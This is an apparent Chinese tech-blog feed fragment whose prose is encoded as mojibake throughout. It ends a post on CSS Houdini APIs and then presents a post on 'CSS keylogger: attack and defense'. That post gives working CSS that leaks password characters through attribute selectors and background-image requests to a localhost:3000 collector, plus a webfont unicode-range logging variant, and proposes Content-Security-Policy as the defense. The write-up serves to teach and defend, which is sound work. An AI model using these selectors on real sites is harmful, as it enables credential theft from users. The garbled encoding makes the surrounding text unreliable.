å…¶å¯¦é™¤äº† Layout Worklets èˆ‡ Paint Worklets å¤–ï¼Œé‚„æœ‰æ‰€è¬‚çš„ Animation Workletï¼Œé›–ç„¶é‚„æ²’æœ‰æ”¾å…¥è¦ç¯„ï¼Œä½†å·²ç¶“æœ‰åœ¨è‘—æ‰‹é€²è¡Œä¸­ï¼Œä¹Ÿæœ‰ Polyfills äº†ï¼ŒChrome çš„ Sticky Header å°±æ˜¯æ¡ç”¨ Houdini çš„ Animation Workletã€‚Twitter çš„ Header Effect ä¹Ÿæ˜¯æ¡ç”¨ Animation WorkletAnimation Worklet æ˜¯æƒ³ä»‹å…¥ Render Pipeline ä¸­çš„ Composite æ­¥é©Ÿï¼Œä¹Ÿå°±æ˜¯åŸæœ¬åˆ©ç”¨ js èˆ‡ css æ§åˆ¶å‹•ç•«æ™‚ï¼Œç€è¦½å™¨æœƒé‡æ–°åŸ·è¡Œçš„éƒ¨åˆ†ã€‚é—œæ–¼ Animation Worklet çš„è©³ç´°å¯¦ä½œä»‹ç´¹å¯ä»¥çœ‹é€™ä»½æŠ•å½±ç‰‡ houdini-codemotion
CSS Parser APIParser API ç›®å‰é‚„æ˜¯è™•åœ¨ Unofficial draftï¼Œä½†æˆ‘ç›¸ä¿¡å¦‚æœé€™å€‹ API ç¢ºèªçš„è©±ï¼Œå°å‰ç«¯é–‹ç™¼æœ‰çµ•å°çš„å¹«åŠ©ï¼Œå¥¹çš„æ¦‚å¿µæ˜¯æƒ³è®“é–‹ç™¼è€…èƒ½æ“´å……ç€è¦½å™¨è§£æ HTMLã€CSS çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œä½ å¯ä»¥æƒ³è¾¦æ³•è®“ä»–çœ‹å¾—æ‡‚æœ€æ–°å®šç¾©çš„ pseudo-classes æˆ–ç”šè‡³æ˜¯ element-queries ç­‰ç­‰ï¼Œé€™æ¨£å°±èƒ½æ­£ç¢ºè§£æå‡º CSSOMï¼Œå¾æ­¤ä¸ç”¨å†ç­‰ç€è¦½å™¨æ›´æ–°ã€‚
CSS Typed OMCSS Typed OM å°±æ˜¯ CSSOM çš„å¼·åŒ–ç‰ˆï¼Œæœ€ä¸»è¦çš„åŠŸèƒ½åœ¨æ–¼å°‡ CSSOM æ‰€ä½¿ç”¨çš„å­—ä¸²å€¼è½‰æ›æˆå…·æœ‰å‹åˆ¥æ„ç¾©çš„ JavaScript è¡¨ç¤ºå½¢æ…‹ï¼Œåƒæ˜¯æ‰€æœ‰çš„ CSS Values éƒ½æœ‰ä¸€å€‹ base class interfaceï¼š
interface CSSStyleValue &#123;    stringifier;    static CSSStyleValue? parse(DOMString property, DOMString cssText);    static sequence&lt;CSSStyleValue&gt;? parseAll(DOMString property, DOMString cssText);&#125;;

ä½ å¯ä»¥å¦‚ä¸‹æ“ä½œ CSS style: (source from CSS Houdini- the bridge between CSS, JavaScript and the browser)source from [CSS Houdini- the bridge between CSS, JavaScript and the browser
// CSS -&gt; JSconst map = document.querySelector(&#x27;.example&#x27;).styleMap;console.log( map.get(&#x27;font-size&#x27;) );// CSSSimpleLength &#123;value: 12, type: &quot;px&quot;, cssText: &quot;12px&quot;&#125;// JS -&gt; JSconsole.log( new CSSUnitValue(5, &quot;px&quot;) );// CSSUnitValue&#123;value:5,unit:&quot;px&quot;,type:&quot;length&quot;,cssText:&quot;5px&quot;&#125;// JS -&gt; CSS// set style &quot;transform: translate3d(0px, -72.0588%, 0px);&quot;elem.outputStyleMap.set(&#x27;transform&#x27;,    new CSSTransformValue([        new CSSTranslation(          0, new CSSSimpleLength(100 - currentPercent, &#x27;%&#x27;), 0        )]));

æ ¹æ“š Drafts çš„å…§å®¹ï¼Œæœ‰äº†å‹åˆ¥å®šç¾©ï¼Œåœ¨ JavaScript çš„æ“ä½œä¸Šæ“šèªªæœƒæœ‰æ•ˆèƒ½ä¸Šçš„é¡¯è‘—æå‡ã€‚æ­¤å¤–ï¼ŒCSS Typed OM ä¹Ÿæ‡‰ç”¨åœ¨ Parser API èˆ‡ CSS Properties API ä¸Šã€‚
Font Metrics APIFont Metrics ä¹Ÿæ²’æœ‰å‡ºç¾åœ¨ä¸Šæ–¹çš„ Houdini API on render pipeline ä¸­ï¼Œä½†å®ƒå…¶å¯¦å·²ç¶“è¢«å¯«å…¥ Draft è¦ç¯„ ä¸­äº†ã€‚è€å¯¦èªªçœ‹ä¸æ˜¯å¾ˆæ‡‚ä»–çš„ spec å¯«çš„å…§å®¹ï¼Œä½†æˆ‘çŒœæ¸¬é€™æ±è¥¿çš„ç”¨é€”æ‡‰è©²è·Ÿé€™ç¯‡æ–‡ç«  Deep dive CSS: font metrics, line-height and vertical-align å…¶ä¸­æåˆ°ä¸€å€‹å•é¡Œæœ‰é—œï¼Œï¼ˆè£¡é¢éå¸¸è©³ç´°çš„ä»‹ç´¹äº† font metricsã€line-height èˆ‡ vertical-align åœ¨ç¶²é ä¸Šå¦‚ä½•äº’ç›¸å½±éŸ¿ï¼Œæ¨è–¦å¤§å®¶æœ‰ç©ºçš„è©±è€å¿ƒé–±è®€ä¸€ç•ªã€‚ï¼‰ï¼š
ä¸åŒ font-family åœ¨ç›¸åŒ font-size ä¸‹ï¼Œæ‰€ç”¢ç”Ÿçš„ span é«˜åº¦æœƒä¸åŒã€‚
source from http://iamvdo.me/en/blog/css-font-metrics-line-height-and-vertical-align
è¦æƒ³æ§åˆ¶ Font metricsï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶å­—æ‰€ä½”çš„å¯¬é«˜çš„è©±ï¼Œç›®å‰å¯ä»¥å…ˆç”¨ CSS Properties ä¾†è™•ç†ï¼Œæ ¹æ“šå·²çŸ¥å­—é«”çš„ font-metrics å‹•æ…‹ç®—å‡ºæˆ‘å€‘è¦ apply å¤šå°‘çš„ font-sizeï¼š
p &#123;    /* å®šç¾©å¥½æˆ‘å€‘å·²çŸ¥å­—å‹çš„ Font metrics */    /* font metrics */    --font: Catamaran;    --fm-capitalHeight: 0.68;    --fm-descender: 0.54;    --fm-ascender: 1.1;    --fm-linegap: 0;    /* å®šç¾©æƒ³è¦çš„é«˜åº¦ */    --capital-height: 100;    /* è¨­å®š font-family */    font-family: var(--font);    /* åˆ©ç”¨ Font metrics çš„è³‡è¨Šèˆ‡æƒ³å®šç¾©çš„é«˜åº¦ä¾†è¨ˆç®—å‡º font-size */    --computedFontSize: (var(--capital-height) / var(--fm-capitalHeight));    font-size: calc(var(--computedFontSize) * 1px);&#125;

è€Œæƒ³å¿… Font Metrics API å°±æ˜¯å¸Œæœ›èƒ½ expose å‡ºæ›´æ–¹ä¾¿çš„ API ä¾†é”æˆä¸Šè¿°çš„äº‹æƒ…ã€‚
çµè«–
Web é–‹ç™¼åŸºæœ¬ä¸Šå°±æ˜¯ç”± HTMLã€JSã€CSS ä¸‰å¤§è¦ç´ æ§‹æˆï¼Œç„¶è€Œ JS èˆ‡ CSS çš„ç™¼å±•å·®ç•°å»æ¥µå…¶é¾å¤§ï¼Œä¸€å€‹é€Ÿåº¦å¿«åˆ°è®“äººè·Ÿä¸ä¸Šï¼Œä¸€å€‹å‰‡æ˜¯ç­‰åŠå¤©é‚„æ˜¯ç„¡æ³•æ”¾å¿ƒä½¿ç”¨æ–°è¦æ ¼ï¼Œå¯¦åœ¨éå¸¸æœ‰è¶£â€¦ä½†é€éé€™æ¬¡äº†è§£ Houdini API çš„éç¨‹ï¼Œç†è§£åˆ°äº† CSS ç®—æ˜¯æœå‘å¥½çš„æ–¹å‘å‰é€²ï¼Œé›–ç„¶å¾ˆå¤šé›¢å¯¦éš›æ¡ç”¨é‚„æœ‰æ®µè·é›¢ï¼Œä½†è‡³å°‘æˆ‘å€‘å·²ç¶“èƒ½å¤ åœ¨æœ€æ–°çš„ç€è¦½å™¨ä¸Šä½¿ç”¨ Custom Properties äº†ï¼CSS çš„æœªä¾†é‚„æ˜¯å……æ»¿å¸Œæœ›çš„ï¼
è³‡æ–™ä¾†æº
CSS Houdini- the bridge between CSS, JavaScript and the browser)
Houdini Draft
Deep dive CSS: font metrics, line-height and vertical-align
Houdini: Maybe The Most Exciting Development In CSS Youâ€™ve Never Heard Of
houdini-samples
Houdini API Draft

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>CSS</tag>
        <tag>Houdini</tag>
        <tag>Custom-Properties</tag>
        <tag>Worklets</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS keyloggerï¼šæ”»æ“Šèˆ‡é˜²ç¦¦</title>
    <url>/2018/03/02/css-key-logger/</url>
    <content><![CDATA[å‰è¨€å‰é™£å­åœ¨ Hacker News ä¸Šé¢çœ‹åˆ°é€™ç¯‡ï¼šShow HN: A CSS Keyloggerï¼Œå¤§é–‹çœ¼ç•Œï¼Œæ±ºå®šè¦æ‰¾å€‹æ™‚é–“å¥½å¥½ä¾†ç ”ç©¶ä¸€ä¸‹ï¼Œä¸¦ä¸”å¯«ä¸€ç¯‡æ–‡ç« åˆ†äº«çµ¦å¤§å®¶ã€‚
é€™ç¯‡æœƒè¬›åˆ°ä»¥ä¸‹æ±è¥¿ï¼š

ä»€éº¼æ˜¯ keylogger
CSS keylogger çš„åŸç†
CSS keylogger èˆ‡ React
é˜²ç¦¦æ–¹æ³•

å¥½ï¼Œé‚£å°±è®“æˆ‘å€‘é–‹å§‹å§ï¼
Keylogger æ˜¯ä»€éº¼ï¼ŸKeylogger å°±æ˜¯éµç›¤å´éŒ„ï¼Œæ˜¯æƒ¡æ„ç¨‹å¼çš„ä¸€ç¨®ï¼Œæ‹¿ä¾†è¨˜éŒ„ä½ é›»è…¦ä¸Šé¢æ‰€æœ‰æŒ‰éçš„æŒ‰éµã€‚é‚„è¨˜å¾—æˆ‘å°æ™‚å€™æ›¾ç¶“ç”¨ VB6 å¯«äº†ä¸€å€‹è¶…ç°¡å–®çš„ keyloggerï¼Œåªè¦å‘¼å«ç³»çµ±æä¾›çš„ API ä¸¦ä¸”è¨˜éŒ„ç›¸å°æ‡‰çš„æŒ‰éµå°±å¥½ã€‚
åœ¨é›»è…¦ä¸Šé¢è¢«è£é€™å€‹çš„è©±ï¼Œå°±ç­‰æ–¼ä½ è¼¸å…¥çš„ä»»ä½•æ±è¥¿éƒ½è¢«è¨˜éŒ„èµ·ä¾†ã€‚ç•¶ç„¶ï¼Œä¹ŸåŒ…å«äº†å¸³è™Ÿè·Ÿå¯†ç¢¼ã€‚ä¸éå¦‚æœæˆ‘æ²’è¨˜éŒ¯ï¼Œé˜²æ¯’è»Ÿé«”çš„è¡Œç‚ºåµæ¸¬æ‡‰è©²å¯ä»¥æŠŠé€™äº›éƒ½æ“‹æ‰ï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨å¤ªéæ“”å¿ƒã€‚
å‰›å‰›è¬›çš„æ˜¯åœ¨é›»è…¦ä¸Šé¢ï¼Œç¾åœ¨æˆ‘å€‘æŠŠç¯„åœç¸®å°ï¼Œä¾·é™åœ¨ç¶²é ã€‚
å¦‚æœä½ è¦åœ¨é é¢ä¸ŠåŠ ä¸€å€‹ keyloggerï¼Œé€šå¸¸æœƒåˆ©ç”¨ JavaScript ä¾†é”æˆï¼Œè€Œä¸”ç¨‹å¼ç¢¼è¶…ç´šç°¡å–®ï¼š
document.addEventListener(&#x27;keydown&#x27;, e =&gt; &#123;  console.log(e.key)&#125;)

åªè¦åµæ¸¬keydownäº‹ä»¶ä¸¦ä¸”æŠ“å‡ºæŒ‰ä¸‹çš„ key å°±è¡Œäº†ã€‚
ä¸éå‡å¦‚ä½ æœ‰èƒ½åŠ›åœ¨ä½ æƒ³å…¥ä¾µçš„ç¶²é ä¸Šé¢åŠ å…¥ JavaScript çš„è©±ï¼Œé€šå¸¸ä¹Ÿä¸éœ€è¦é€™éº¼éº»ç…©å»è¨˜éŒ„æ¯å€‹æŒ‰éµï¼Œä½ ç›´æ¥æŠŠ Cookie å·èµ°ã€ç«„æ”¹é é¢ã€å°åˆ°é‡£é­šé é¢ï¼Œæˆ–è€…æ˜¯åœ¨ submit çš„æ™‚å€™æŠŠå¸³è™Ÿå¯†ç¢¼å›å‚³çµ¦è‡ªå·±çš„ Server å°±å¥½ï¼Œæ‰€ä»¥ keylogger é¡¯å¾—ä¸æ˜¯é‚£éº¼æœ‰ç”¨ã€‚
å¥½ï¼Œé‚£å‡è¨­æˆ‘å€‘ç¾åœ¨æ²’è¾¦æ³•æ’å…¥æƒ¡æ„çš„ JavaScriptï¼Œåªèƒ½æ”¹ CSSï¼Œæœ‰è¾¦æ³•ç”¨ç´” CSS åšå‡ºä¸€å€‹ keylogger å—ï¼Ÿ
æœ‰ï¼Œç•¢ç«Ÿ CSS èƒ½åšçš„äº‹æƒ…å¯å¤šäº†ã€‚
ç´” CSS keylogger çš„åŸç†ç›´æ¥çœ‹ç¨‹å¼ç¢¼ä½ å°±æ‡‚äº†ï¼ˆå–è‡ªï¼šmaxchehab&#x2F;CSS-Keyloggingï¼‰ï¼š
input[type=&quot;password&quot;][value$=&quot;a&quot;] &#123;  background-image: url(&quot;http://localhost:3000/a&quot;);&#125;

ç¥å¥‡å§ï¼
å¦‚æœä½ ä¸ç†Ÿæ‚‰ CSS selectorï¼Œé€™é‚Šå¹«ä½ è¤‡ç¿’ä¸€ä¸‹ã€‚ä¸Šé¢é‚£æ®µæ„æ€å°±æ˜¯èªªå¦‚æœ type æ˜¯ password çš„ inputï¼Œvalue ä»¥ a çµå°¾çš„è©±ï¼ŒèƒŒæ™¯åœ–å°±è¼‰å…¥http://localhost:3000/a ã€‚
ç¾åœ¨æˆ‘å€‘å¯ä»¥æŠŠé€™ä¸² CSS æ”¹ä¸€ä¸‹ï¼Œæ–°å¢å¤§å°å¯«è‹±æ–‡å­—æ¯ã€æ•¸å­—ç”šè‡³æ˜¯ç‰¹æ®Šç¬¦è™Ÿï¼Œæ¥è‘—æœƒç™¼ç”Ÿä»€éº¼äº‹å‘¢ï¼Ÿ
å¦‚æœæˆ‘è¼¸å…¥ abc123ï¼Œç€è¦½å™¨å°±æœƒç™¼é€ Request åˆ°ï¼š

http://localhost:3000/a
http://localhost:3000/b
http://localhost:3000/c
http://localhost:3000/1
http://localhost:3000/2
http://localhost:3000/3

å°±é€™æ¨£ï¼Œä½ çš„å¯†ç¢¼å°±å®Œå…¨è¢«æ”»æ“Šè€…çµ¦æŒæ¡äº†ã€‚
é€™å°±æ˜¯ CSS keylogger çš„åŸç†ï¼Œåˆ©ç”¨ CSS Selector æ­é…è¼‰å…¥ä¸åŒçš„ç¶²å€ï¼Œå°±èƒ½å¤ æŠŠå¯†ç¢¼çš„æ¯ä¸€å€‹å­—å…ƒç™¼é€åˆ° Server å»ã€‚
çœ‹èµ·ä¾†å¾ˆå¯æ€•å°å§ï¼Œåˆ¥æ€•ï¼Œå…¶å¯¦æ²’é‚£éº¼å®¹æ˜“ã€‚
CSS keylogger çš„é™åˆ¶ä¸èƒ½ä¿è­‰é †åºé›–ç„¶ä½ è¼¸å…¥çš„æ™‚å€™æ˜¯æŒ‰ç…§é †åºè¼¸å…¥çš„ï¼Œä½† Request æŠµé”å¾Œç«¯çš„æ™‚å€™ä¸¦ä¸èƒ½ä¿è­‰é †åºï¼Œæ‰€ä»¥æœ‰æ™‚å€™é †åºæœƒäº‚æ‰ã€‚ä¾‹å¦‚èªª abc123 è®Šæˆ bca213 ä¹‹é¡çš„ã€‚
ä½†å¦‚æœæˆ‘å€‘æŠŠ CSS Selector æ”¹ä¸€ä¸‹çš„è©±ï¼Œå…¶å¯¦å°±èƒ½è§£æ±ºé€™å€‹å•é¡Œï¼š
input[value^=&quot;a&quot;] &#123;  background-image: url(&quot;http://localhost:3000/a_&quot;);&#125;  input[value*=&quot;aa&quot;] &#123;  background-image: url(&quot;http://localhost:3000/aa&quot;);&#125;  input[value*=&quot;ab&quot;] &#123;  background-image: url(&quot;http://localhost:3000/ab&quot;);&#125;

å¦‚æœé–‹é ­æ˜¯ aï¼Œæˆ‘å€‘å°±é€å‡ºa_ï¼Œæ¥è‘—é‡å° 26 å€‹å­—æ¯è·Ÿæ•¸å­—çš„æ’åˆ—çµ„åˆæ¯å…©å€‹å­—å…ƒé€å‡ºä¸€å€‹ requestï¼Œä¾‹å¦‚èªªï¼šabc123ï¼Œå°±æœƒæ˜¯ï¼š

a_
ab
bc
c1
12
23

å°±ç®—é †åºäº‚æ‰ï¼Œé€éé€™ç¨®é—œä¿‚ä½ æŠŠå­—æ¯é‡æ–°çµ„åˆèµ·ä¾†ï¼Œé‚„æ˜¯å¯ä»¥å¾—åˆ°æ­£ç¢ºçš„å¯†ç¢¼é †åºã€‚
é‡è¤‡å­—å…ƒä¸æœƒé€å‡º Requestå› ç‚ºè¼‰å…¥çš„ç¶²å€ä¸€æ¨£ï¼Œæ‰€ä»¥é‡è¤‡çš„å­—å…ƒå°±ä¸æœƒå†è¼‰å…¥åœ–ç‰‡ï¼Œä¸æœƒç™¼é€æ–°çš„ Requestã€‚é€™å€‹å•é¡Œç›®å‰æ“šæˆ‘æ‰€çŸ¥æ‡‰è©²æ˜¯è§£ä¸æ‰ã€‚
åœ¨è¼¸å…¥çš„æ™‚å€™ï¼Œå…¶å¯¦ value ä¸æœƒè®Šé€™å€‹å…¶å¯¦æ˜¯ CSS Keylogger æœ€å¤§çš„å•é¡Œã€‚
ç•¶ä½ åœ¨ input è¼¸å…¥è³‡è¨Šçš„æ™‚å€™ï¼Œå…¶å¯¦ input çš„ value æ˜¯ä¸æœƒè®Šçš„ï¼Œæ‰€ä»¥ä¸Šé¢è¬›çš„é‚£äº›å®Œå…¨ä¸ç®¡ç”¨ã€‚ä½ å¯ä»¥è‡ªå·±è©¦è©¦çœ‹å°±çŸ¥é“äº†ï¼Œinput çš„å…§å®¹æœƒè®Šï¼Œä½†æ˜¯ä½ ç”¨ dev tool çœ‹çš„è©±ï¼Œæœƒç™¼ç¾ value å®Œå…¨ä¸æœƒè®Šã€‚
é‡å°é€™å€‹å•é¡Œï¼Œæœ‰å…©å€‹è§£æ±ºæ–¹æ¡ˆï¼Œç¬¬ä¸€å€‹æ˜¯åˆ©ç”¨ Webfontï¼š
&lt;!doctype html&gt;&lt;title&gt;css keylogger&lt;/title&gt;&lt;style&gt;@font-face &#123; font-family: x; src: url(./log?a), local(Impact); unicode-range: U+61; &#125;@font-face &#123; font-family: x; src: url(./log?b), local(Impact); unicode-range: U+62; &#125;@font-face &#123; font-family: x; src: url(./log?c), local(Impact); unicode-range: U+63; &#125;@font-face &#123; font-family: x; src: url(./log?d), local(Impact); unicode-range: U+64; &#125;input &#123; font-family: x, &#x27;Comic sans ms&#x27;; &#125;&lt;/style&gt;&lt;input value=&quot;a&quot;&gt;type `bcd` and watch network log
ï¼ˆç¨‹å¼ç¢¼å–è‡ªï¼šKeylogger using webfont with single character unicode-rangeï¼‰
value ä¸æœƒè·Ÿè‘—è®Šåˆæ€æ¨£ï¼Œå­—é«”ç¸½æœƒç”¨åˆ°äº†å§ï¼åªè¦æ¯æ‰“ä¸€å€‹å­—ï¼Œå°±æœƒé€å‡ºç›¸å°æ‡‰çš„ Requestã€‚
ä½†é€™å€‹æ–¹æ³•çš„ä¾·é™æœ‰å…©å€‹ï¼š

æ²’è¾¦æ³•ä¿è­‰é †åºï¼Œä¸€æ¨£ä¹Ÿæ²’è¾¦æ³•è§£æ±ºé‡è¤‡å­—å…ƒçš„å•é¡Œ
å¦‚æœæ¬„ä½æ˜¯&lt;input type=&#39;password&#39; /&gt;ï¼Œå°±æ²’æœ‰ç”¨

ï¼ˆåœ¨ç ”ç©¶ç¬¬äºŒå€‹ä¾·é™çš„æ™‚å€™ç™¼ç¾ä¸€ä»¶æœ‰è¶£çš„äº‹ï¼Œç”±æ–¼ Chrome è·Ÿ Firefox æœƒæŠŠã€Œé é¢ä¸Šæœ‰ type æ˜¯ password çš„ inputï¼Œä½†æ˜¯åˆæ²’ç”¨ HTTPSã€çš„ç¶²ç«™æ¨™ç¤ºç‚ºä¸å®‰å…¨ï¼Œæ‰€ä»¥æœ‰äººç ”ç©¶å‡ºç”¨æ™®é€š input æ­é…ç‰¹æ®Šå­—é«”ä¾†èº²éé€™å€‹åµæ¸¬ï¼Œä¸¦ä¸”è®“è¼¸å…¥æ¡†çœ‹èµ·ä¾†åƒæ˜¯ passwordï¼ˆä½†å…¶å¯¦ type ä¸æ˜¯ passwordï¼‰ï¼Œåœ¨é€™ç¨®æƒ…å½¢ä¸‹å°±å¯ä»¥ç”¨ Webfont ä¾†æ”»æ“Šäº†ï¼‰
å†ä¾†æˆ‘å€‘çœ‹ç¬¬äºŒç¨®è§£æ±ºæ–¹æ¡ˆï¼Œå‰›å‰›æœ‰èªªåˆ°é€™å€‹å•é¡Œçš„ç™¥çµé»åœ¨æ–¼ value ä¸æœƒè®Šï¼Œæ›å¥è©±èªªï¼Œå¦‚æœä½  input è¼¸å…¥å€¼çš„æ™‚å€™ï¼Œvalue æœƒè·Ÿè‘—è®Šçš„è©±ï¼Œé€™å€‹æ”»æ“Šæ‰‹æ³•å°±å¾ˆç”¨äº†ã€‚
å—¯â€¦æœ‰æ²’æœ‰ä¸€ç¨®å¾ˆç†Ÿæ‚‰çš„æ„Ÿè¦ºã€‚
class NameForm extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;value: &#x27;&#x27;&#125;;      this.handleChange = this.handleChange.bind(this);  &#125;    handleChange(event) &#123;    this.setState(&#123;value: event.target.value&#125;);  &#125;    render() &#123;    return (      &lt;form&gt;        &lt;label&gt;          Name:          &lt;input type=&quot;text&quot; value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt;        &lt;/label&gt;      &lt;/form&gt;    );  &#125;&#125;
ï¼ˆä»¥ä¸Šç¨‹å¼ç¢¼æ”¹å¯«è‡ªReact å®˜ç¶²ï¼‰
å¦‚æœä½ ç”¨é React çš„è©±ï¼Œæ‡‰è©²æœƒå¾ˆç†Ÿæ‚‰é€™å€‹æ¨¡å¼ã€‚ä½ åœ¨è¼¸å…¥ä»»ä½•æ±è¥¿çš„æ™‚å€™ï¼Œæœƒå…ˆæ”¹è®Š stateï¼Œå†æŠŠ state çš„å€¼å°æ‡‰åˆ° input çš„ value å»ã€‚å› æ­¤ä½ è¼¸å…¥ä»€éº¼ï¼Œvalue å°±æœƒæ˜¯ä»€éº¼ã€‚
React æ˜¯è¶…å¤¯çš„å‰ç«¯ Libraryï¼Œå¯ä»¥æƒ³åƒæœ‰ä¸€å¤§å †ç¶²é éƒ½æ˜¯ç”¨ React åšçš„ï¼Œè€Œä¸”åªè¦æ˜¯ Reactï¼Œå¹¾ä¹å°±èƒ½ä¿è­‰ input çš„ value ä¸€å®šæœƒåŒæ­¥æ›´æ–°ï¼ˆå¹¾ä¹å•¦ï¼Œä½†æ‡‰è©²é‚„æ˜¯æœ‰å°‘æ•¸æ²’æœ‰éµå¾ªé€™å€‹è¦å‰‡ï¼‰ã€‚
åœ¨é€™é‚Šå…ˆåšå€‹ç¸½çµï¼Œåªè¦ä½  input çš„ value æœƒå°æ‡‰åˆ°è£¡é¢çš„å€¼ï¼ˆå‡å¦‚ä½ ç”¨ Reactï¼Œå¹¾ä¹ä¸€å®šæœƒé€™æ¨£å¯«ï¼‰ï¼Œä¸¦ä¸”æœ‰åœ°æ–¹å¯ä»¥è®“åˆ¥äººå¡å…¥è‡ªè¨‚çš„ CSS çš„è©±ï¼Œå°±èƒ½æˆåŠŸå¯¦ä½œå‡º CSS Keyloggerã€‚é›–ç„¶æœ‰äº›ç¼ºé™·ï¼ˆæ²’è¾¦æ³•åµæ¸¬é‡è¤‡å­—å…ƒï¼‰ï¼Œä½†æ¦‚å¿µä¸Šæ˜¯å¯è¡Œçš„ï¼Œåªæ˜¯ç²¾æº–åº¦æ²’é‚£éº¼é«˜ã€‚
React çš„å›æ‡‰React çš„ç¤¾ç¾¤ä¹Ÿæœ‰é‡å°é€™ä¸€å€‹å•é¡Œé€²è¡Œè¨è«–ï¼Œéƒ½åœ¨ Stop syncing value attribute for controlled inputs #11896 é€™å€‹ Issue è£¡ã€‚
äº‹å¯¦ä¸Šï¼Œè®“ input çš„ value è·Ÿè¼¸å…¥çš„å€¼åŒæ­¥é€™ä»¶äº‹æƒ…ä¸€ç›´éƒ½æœƒæœ‰ä¸€äº› bugï¼Œä»¥å‰ç”šè‡³ç™¼ç”Ÿäº†çŸ¥åæµé‡åˆ†æç¶²ç«™ Mixpanel ä¸å°å¿ƒè¨˜éŒ„æ•æ„Ÿè³‡è¨Šçš„äº‹ä»¶ï¼Œè€Œæœ€æ ¹æœ¬çš„åŸå› å°±æ˜¯å› ç‚º React æœƒä¸€ç›´åŒæ­¥æ›´æ–° valueã€‚
Issue çš„è¨è«–æ»¿å€¼å¾—ä¸€çœ‹çš„ï¼Œè£¡é¢æœ‰æåˆ°å¤§å®¶å¸¸ææ··çš„ä¸€ä»¶äº‹æƒ…ï¼šInput çš„ attributes è·Ÿ propertiesã€‚æˆ‘æ‰¾åˆ° Stackover flow ä¸Šé¢ä¸€ç¯‡ä¸éŒ¯çš„è§£é‡‹ï¼šWhat is the difference between properties and attributes in HTML?
attributes åŸºæœ¬ä¸Šå°±æ˜¯ä½  HTML ä¸Šé¢çš„é‚£å€‹æ±è¥¿ï¼Œè€Œ properties ä»£è¡¨çš„æ˜¯å¯¦éš›çš„ valueï¼Œå…©å€‹ä¸ä¸€å®šæœƒç›¸ç­‰ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š
&lt;input id=&quot;the-input&quot; type=&quot;text&quot; value=&quot;Name:&quot;&gt;

å‡å¦‚ä½ ä»Šå¤©æŠ“é€™å€‹ input çš„ attributeï¼Œä½ æœƒå¾—åˆ°Name:ï¼Œä½†å¦‚æœä½ ä»Šå¤©æŠ“ input çš„ valueï¼Œä½ æœƒå¾—åˆ°ç›®å‰åœ¨è¼¸å…¥æ¡†è£¡é¢çš„å€¼ã€‚æ‰€ä»¥å…¶å¯¦é€™å€‹ attribute å°±è·Ÿæˆ‘å€‘å¸¸ç”¨çš„ defaultValue æ˜¯ä¸€æ¨£çš„æ„æ€ï¼Œå°±æ˜¯é è¨­å€¼ã€‚
ä¸éåœ¨ React è£¡é¢ï¼Œä»–æœƒæŠŠ attribute è·Ÿ value åŒæ­¥ï¼Œæ‰€ä»¥ä½  value æ˜¯ä»€éº¼ï¼Œattribute å°±æœƒæ˜¯ä»€éº¼ã€‚
å¾è¨è«–çœ‹èµ·ä¾†ï¼Œåœ¨ React 17 æ»¿æœ‰æ©ŸæœƒæŠŠé€™å€‹æ©Ÿåˆ¶æ‹¿æ‰ï¼Œè®“é€™å…©è€…ä¸å†åŒæ­¥ã€‚
é˜²ç¦¦æ–¹æ³•ä¸Šé¢è¬›äº†é€™éº¼å¤šï¼Œå› ç‚ºç¾ä»Š React é‚„æ²’æŠŠé€™å€‹æ”¹æ‰ï¼Œæ‰€ä»¥å•é¡Œé‚„æ˜¯å­˜åœ¨è‘—ã€‚è€Œä¸”å…¶å¯¦é™¤äº† Reactï¼Œä¹Ÿå¯èƒ½æœ‰åˆ¥çš„ Library åšäº†å·®ä¸å¤šçš„äº‹æƒ…ã€‚
Client ç«¯çš„é˜²ç¦¦æ–¹æ³•æˆ‘å°±ä¸æäº†ï¼ŒåŸºæœ¬å°±æ˜¯è£ä¸€äº›åˆ¥äººå¯«å¥½çš„ Chrome Extensionï¼Œå¯ä»¥å¹«ä½ åµæ¸¬ç¬¦åˆæ¨¡å¼çš„ CSS ä¹‹é¡çš„ï¼Œé€™é‚Šæ¯”è¼ƒå€¼å¾—æçš„æ˜¯ Server ç«¯çš„é˜²ç¦¦ã€‚
ç›®å‰çœ‹èµ·ä¾†æœ€ä¸€å‹æ°¸é€¸çš„è§£æ±ºæ–¹æ¡ˆå°±æ˜¯ Content-Security-Policyï¼Œç°¡è€Œè¨€ä¹‹å®ƒæ˜¯ä¸€å€‹ HTTP Response çš„ headerï¼Œç”¨ä¾†æ±ºå®šç€è¦½å™¨å¯ä»¥è¼‰å…¥å“ªäº›è³‡æºï¼Œä¾‹å¦‚èªªç¦æ­¢ inline ç¨‹å¼ç¢¼ã€åªèƒ½è¼‰å…¥åŒå€‹ domain ä¸‹çš„è³‡æºä¹‹é¡çš„ã€‚
é€™å€‹ Header çš„åˆè¡·å°±æ˜¯ç‚ºäº†é˜²æ­¢ XSS ä»¥åŠæ”»æ“Šè€…è¼‰å…¥å¤–éƒ¨çš„æƒ¡æ„ç¨‹å¼ç¢¼ï¼ˆä¾‹å¦‚èªªæˆ‘å€‘é€™å€‹ CSS keyloggerï¼‰ã€‚æƒ³çŸ¥é“æ›´è©³ç´°çš„ç”¨æ³•å¯ä»¥åƒè€ƒé€™ç¯‡ï¼šContent-Security-Policy - HTTP Headers çš„è³‡å®‰è­°é¡Œ (2)
